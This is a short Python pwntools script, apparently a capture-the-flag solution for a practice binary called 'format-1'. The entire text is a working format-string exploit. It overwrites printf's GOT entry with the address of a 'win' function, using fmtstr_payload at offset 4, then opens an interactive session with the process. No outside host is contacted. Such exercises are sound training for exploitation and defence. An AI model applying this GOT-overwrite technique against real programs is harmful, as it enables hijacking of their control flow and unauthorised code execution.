from pwn import *

e = ELF('./format-1')
p = process('./format-1')

printf_addr = e.got['printf']
win_addr = e.symbols['win']

payload = fmtstr_payload(4,{printf_addr : win_addr})

p.sendline(payload)
p.interactive()
print p.recv()